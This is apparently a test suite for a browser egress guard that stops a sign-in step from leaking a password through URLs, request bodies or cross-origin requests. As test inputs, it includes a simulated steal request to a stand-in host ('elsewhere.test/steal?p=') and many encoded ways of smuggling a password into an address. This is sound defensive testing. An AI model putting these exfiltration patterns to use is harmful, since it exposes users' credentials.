import { expect, test } from 'bun:test';
import type { BrowserContext, Request, Route } from 'playwright';
import {
  BrowserNetworkError,
  type BrowserNetworkResponse,
  carriesSecret,
  createBrowserEgress,
  printCarried,
  SIGN_IN_MUTATIONS,
  secretPrint,
} from './egress.ts';

const PAGE = 'https://www.example.com/login';
const PASSWORD = 'Planted pässword+7f3a91&"x';

type Spec = { url: string; method?: string; resourceType?: string; body?: string };

/** A fake browser that holds one page on PAGE and hands each request to the guard. */
async function setup() {
  let handler: ((route: Route) => Promise<void>) | undefined;
  let current = 'about:blank';
  const context = {
    pages: () => [{ url: () => current }],
    serviceWorkers: () => [],
    route: async (_pattern: string, value: typeof handler) => {
      handler = value;
    },
    routeWebSocket: async () => {},
  } as unknown as BrowserContext;
  const sent: string[] = [];
  const egress = createBrowserEgress(
    { public_compartment: true, allowed_domains: [] },
    {
      resolve: async () => [{ address: '8.8.8.8', family: 4 }],
      transport: async (url, _address, options): Promise<BrowserNetworkResponse> => {
        sent.push(`${options.method} ${url.href}`);
        return { status: 200, headers: { 'content-type': 'text/html' }, body: Buffer.from('ok') };
      },
    },
  );
  await egress.install(context);
  current = PAGE;
  const dispatch = async (spec: Spec) => {
    const document = (spec.resourceType ?? 'document') === 'document';
    const request = {
      url: () => spec.url,
      method: () => spec.method ?? 'GET',
      resourceType: () => spec.resourceType ?? 'document',
      postDataBuffer: () => (spec.body === undefined ? null : Buffer.from(spec.body)),
      allHeaders: async () =>
        spec.method === 'POST' ? { 'content-type': 'application/x-www-form-urlencoded' } : {},
      redirectedFrom: () => null,
      isNavigationRequest: () => document,
      frame: () => ({
        url: () => PAGE,
        parentFrame: () => null,
        page: () => ({ opener: async () => null, mainFrame: () => ({ url: () => PAGE }) }),
      }),
    } as unknown as Request;
    let aborted = false;
    const route = {
      request: () => request,
      fulfill: async () => {},
      abort: async () => {
        aborted = true;
      },
    } as unknown as Route;
    if (!handler) throw new Error('route is not installed');
    await handler(route);
    return aborted;
  };
  return { egress, dispatch, sent };
}

const code = async (promise: Promise<unknown>) => {
  try {
    await promise;
    return 'none';
  } catch (error) {
    return error instanceof BrowserNetworkError ? error.code : String(error);
  }
};

test('the password is found however a page writes it into an address or a body', () => {
  const forms = [
    PASSWORD,
    encodeURIComponent(PASSWORD),
    encodeURIComponent(PASSWORD).replace(/%[0-9A-F]{2}/g, (hex) => hex.toLowerCase()),
    new URLSearchParams([['p', PASSWORD]]).toString().slice(2),
    JSON.stringify(PASSWORD).slice(1, -1),
    JSON.stringify(PASSWORD)
      .slice(1, -1)
      .replace(/[^\x20-\x7e]/g, (c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`),
  ];
  for (const form of forms) {
    expect([form, carriesSecret(`https://www.example.com/x?a=1&p=${form}#y`, PASSWORD)]).toEqual([
      form,
      true,
    ]);
    expect([form, carriesSecret(`{"user":"jo","password":"${form}"}`, PASSWORD)]).toEqual([
      form,
      true,
    ]);
  }
  expect(carriesSecret('https://www.example.com/account?p=Planted', PASSWORD)).toBe(false);
  expect(carriesSecret('https://www.example.com/%E0%A4%A', PASSWORD)).toBe(false);
});

test('a sign-in step never sends the password in an address, to its own site or any other', async () => {
  for (const spec of [
    { url: `https://www.example.com/login?password=${encodeURIComponent(PASSWORD)}` },
    {
      url: `https://www.example.com/login?${new URLSearchParams([['password', PASSWORD]])}`,
      resourceType: 'fetch',
    },
    {
      url: `https://elsewhere.test/steal?p=${encodeURIComponent(PASSWORD)}`,
      resourceType: 'image',
    },
    {
      url: `https://www.example.com/login?password=${encodeURIComponent(PASSWORD)}`,
      method: 'POST',
      body: 'a=1',
    },
  ]) {
    const { egress, dispatch, sent } = await setup();
    const aborted = { value: false };
    expect(
      await code(
        egress.run(
          'sign_in',
          async () => {
            aborted.value = await dispatch(spec);
          },
          undefined,
          undefined,
          undefined,
          PASSWORD,
        ),
      ),
    ).toBe('sign_in_secret_in_url');
    expect(aborted.value).toBe(true);
    expect(sent).toEqual([]);
  }
});

test('a script sending the password to another origin ends the step instead of being dropped', async () => {
  for (const body of [
    new URLSearchParams([
      ['email', 'jo@example.com'],
      ['password', PASSWORD],
    ]).toString(),
    JSON.stringify({ email: 'jo@example.com', password: PASSWORD }),
  ]) {
    const { egress, dispatch, sent } = await setup();
    expect(
      await code(
        egress.run(
          'sign_in',
          () =>
            dispatch({
              url: 'https://api.example.com/session',
              method: 'POST',
              resourceType: 'fetch',
              body,
            }),
          undefined,
          undefined,
          undefined,
          PASSWORD,
        ),
      ),
    ).toBe('sign_in_secret_elsewhere');
    expect(sent).toEqual([]);
    expect(egress.takeDropped()).toEqual([]);
  }
});

test('a beacon to another origin that carries no password is still held back quietly', async () => {
  const { egress, dispatch, sent } = await setup();
  await egress.run(
    'sign_in',
    () =>
      dispatch({
        url: 'https://analytics.test/collect',
        method: 'POST',
        resourceType: 'ping',
        body: 'event=click',
      }),
    undefined,
    undefined,
    undefined,
    PASSWORD,
  );
  expect(sent).toEqual([]);
  expect(egress.takeDropped()).toEqual(['POST analytics.test']);
});

test("a site's own requests past the sign-in budget are held back, and the step goes on", async () => {
  const { egress, dispatch, sent } = await setup();
  await egress.run(
    'sign_in',
    async () => {
      for (let index = 0; index <= SIGN_IN_MUTATIONS; index++)
        await dispatch({
          url: `https://www.example.com/api/rpc?n=${index}`,
          method: 'POST',
          resourceType: 'fetch',
          body: '{}',
        });
    },
    undefined,
    undefined,
    undefined,
    PASSWORD,
  );
  expect(sent).toHaveLength(SIGN_IN_MUTATIONS);
  expect(egress.takeDropped()).toEqual(['POST www.example.com']);
  // A document sent past the budget still ends the step: that is the page itself.
  const again = await setup();
  expect(
    await code(
      again.egress.run('sign_in', async () => {
        for (let index = 0; index <= SIGN_IN_MUTATIONS; index++)
          await again.dispatch({ url: 'https://www.example.com/login', method: 'POST', body: 'a' });
      }),
    ),
  ).toBe('sign_in_budget');
});

/** Every way the verifier's probe and a page's own script can write a password into an address. */
function addressForms(password: string): string[] {
  const latin1 = !/[Ā-￿]/.test(password);
  return [
    // A script that builds the address by joining strings: the URL parser escapes only some
    // characters and leaves `+` as it is.
    new URL(`https://site.test/login?u=me&p=${password}`).href,
    new URL(`https://site.test/x/${password}`).href,
    `https://site.test/?p=${encodeURIComponent(password)}`,
    `https://site.test/?${new URLSearchParams({ p: password })}`,
    `https://site.test/?p=${encodeURIComponent(encodeURIComponent(password))}`,
    `https://site.test/?p=${encodeURIComponent(new URLSearchParams({ p: password }).toString().slice(2))}`,
    // Base64 of a secret shorter than 8 characters is too short to tell from chance.
    ...(password.length >= 8
      ? [
          `https://site.test/?p=${Buffer.from(password, 'utf8').toString('base64')}`,
          `https://site.test/?p=${encodeURIComponent(Buffer.from(`jo:${password}`, 'utf8').toString('base64url'))}`,
        ]
      : []),
    ...(latin1 ? [`https://site.test/?p=${escape(password)}`] : []),
  ];
}

test('a password with a plus and an escaped character is found however the address was built', () => {
  for (const password of [
    "Tom's+pw1",
    'a+b c',
    'p+"q"',
    'x+é9',
    'hunter2+<3',
    'café+1',
    PASSWORD,
    'Correct-Horse-7+',
  ])
    for (const address of addressForms(password))
      expect([password, address, carriesSecret(address, password)]).toEqual([
        password,
        address,
        true,
      ]);
  // The verifier's exact misses.
  expect(carriesSecret('https://site.test/login?u=me&p=Tom%27s+pw1', "Tom's+pw1")).toBe(true);
  expect(carriesSecret('https://site.test/login?u=me&p=a+b%20c', 'a+b c')).toBe(true);
  expect(carriesSecret("https://site.test/?p=Tom's%252Bpw1", "Tom's+pw1")).toBe(true);
  expect(carriesSecret('https://site.test/?p=caf%E9%2B1', 'café+1')).toBe(true);
});

test('a short password, or one of letters or digits alone, is matched only as a whole part', () => {
  // The site's own addresses hold such words and numbers by chance: never a refusal.
  for (const [address, password] of [
    ['https://cdn.site.test/app.js?v=20261015123456', '123456'],
    ['https://github.com/login', 'github'],
    ['https://site.test/login?next=/account', 'account'],
    ['https://site.test/login?next=%2Faccount', 'account'],
    ['https://site.test/js/password-strength.js', 'password'],
    ['https://site.test/t?ts=1712345678901', '12345678'],
    ['https://site.test/x/1234.js', '1234'],
    ['{"build":"20261015123456"}', '123456'],
    ['event=page_view&path=%2Faccount%2Fsettings', 'account'],
  ] as const)
    expect([address, password, carriesSecret(address, password)]).toEqual([
      address,
      password,
      false,
    ]);
  // Sent as a value or a path segment of its own, however written, it is still found.
  for (const password of ['123456', 'github', 'account', 'pässwort', '12345678', 'Ab3$', 'q+1']) {
    for (const address of [
      `https://site.test/login?u=me&p=${password}`,
      `https://site.test/login?u=me&p=${encodeURIComponent(password)}`,
      `https://site.test/login?${new URLSearchParams({ u: 'me', p: password })}`,
      `https://site.test/login?u=me&p=${encodeURIComponent(encodeURIComponent(password))}`,
      `https://site.test/pin/${encodeURIComponent(password)}/check`,
      `https://site.test/login#p=${encodeURIComponent(password)}`,
    ])
      expect([password, address, carriesSecret(address, password)]).toEqual([
        password,
        address,
        true,
      ]);
    for (const body of [
      `u=me&p=${encodeURIComponent(password)}`,
      JSON.stringify({ u: 'me', p: password }),
      JSON.stringify({ u: 'me', p: password }).replace(
        /[^\x20-\x7e]/g,
        (c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`,
      ),
      `--b\r\nContent-Disposition: form-data; name="p"\r\n\r\n${password}\r\n--b--`,
    ])
      expect([password, body, carriesSecret(body, password)]).toEqual([password, body, true]);
  }
  // A short password that a part break could cut is looked for anywhere: never missed.
  expect(carriesSecret('https://site.test/?q=xa/b', 'a/b')).toBe(true);
  expect(carriesSecret('https://site.test/?q=a%26b', 'a&b')).toBe(true);
});

test("a sign-in's own request past the budget is still sent, and what is held back says so", async () => {
  const { egress, dispatch, sent } = await setup();
  await egress.run(
    'sign_in',
    async () => {
      for (let index = 0; index < SIGN_IN_MUTATIONS; index++)
        await dispatch({
          url: `https://www.example.com/api/telemetry?n=${index}`,
          method: 'POST',
          resourceType: 'fetch',
          body: '{}',
        });
      // The sign-in itself, the seventeenth write of a busy page.
      await dispatch({
        url: 'https://www.example.com/api/session',
        method: 'POST',
        resourceType: 'fetch',
        body: JSON.stringify({ email: 'jo@example.com', password: PASSWORD }),
      });
      // So is one that carries only the username, as a username-first step sends it.
      await dispatch({
        url: 'https://www.example.com/api/lookup',
        method: 'POST',
        resourceType: 'fetch',
        body: 'email=jo%40example.com',
      });
      // Another write past the budget is held back, and named as held for the budget.
      await dispatch({
        url: 'https://www.example.com/api/telemetry?n=late',
        method: 'POST',
        resourceType: 'fetch',
        body: '{}',
      });
    },
    undefined,
    undefined,
    undefined,
    PASSWORD,
    ['jo@example.com'],
  );
  expect(sent).toContain('POST https://www.example.com/api/session');
  expect(sent).toContain('POST https://www.example.com/api/lookup');
  expect(sent).not.toContain('POST https://www.example.com/api/telemetry?n=late');
  expect(egress.takeSignInHeld()).toEqual([
    { method: 'POST', host: 'www.example.com', budget: true, credentials: false },
  ]);
});

test('a write held back from another origin says whether it may have been the sign-in', async () => {
  const { egress, dispatch } = await setup();
  await egress.run(
    'sign_in',
    async () => {
      await dispatch({
        url: 'https://metrics.example.com/collect',
        method: 'POST',
        resourceType: 'ping',
        body: 'event=submit',
      });
      await dispatch({
        url: 'https://api.example.com/v1/lookup',
        method: 'POST',
        resourceType: 'fetch',
        body: JSON.stringify({ email: 'jo@example.com' }),
      });
      await dispatch({
        url: 'https://login.example.com/oauth/token',
        method: 'POST',
        resourceType: 'fetch',
        body: 'grant=x',
      });
    },
    undefined,
    undefined,
    undefined,
    PASSWORD,
    ['jo@example.com'],
  );
  expect(egress.takeSignInHeld()).toEqual([
    { method: 'POST', host: 'metrics.example.com', budget: false, credentials: false },
    { method: 'POST', host: 'api.example.com', budget: false, credentials: true },
    { method: 'POST', host: 'login.example.com', budget: false, credentials: true },
  ]);
  expect(egress.takeSignInHeld()).toEqual([]);
});

test('a print of the password finds it in an address as the password does, and holds no password', () => {
  for (const password of ["Tom's+pw1", 'a+b c', 'x+é9', PASSWORD, '123456', 'account', 'q+1']) {
    const print = secretPrint(password);
    expect(JSON.stringify(print)).not.toContain(password);
    for (const address of [
      ...addressForms(password),
      `https://site.test/login?u=me&p=${encodeURIComponent(password)}`,
      `https://site.test/login#p=${encodeURIComponent(password)}`,
    ])
      expect([password, address, printCarried(address, print)]).toEqual([
        password,
        address,
        carriesSecret(address, password),
      ]);
  }
  for (const [address, password] of [
    ['https://cdn.site.test/app.js?v=20261015123456', '123456'],
    ['https://site.test/login?next=/account', 'account'],
    ['https://www.example.com/account?p=Planted', PASSWORD],
  ] as const)
    expect(printCarried(address, secretPrint(password))).toBe(false);
});
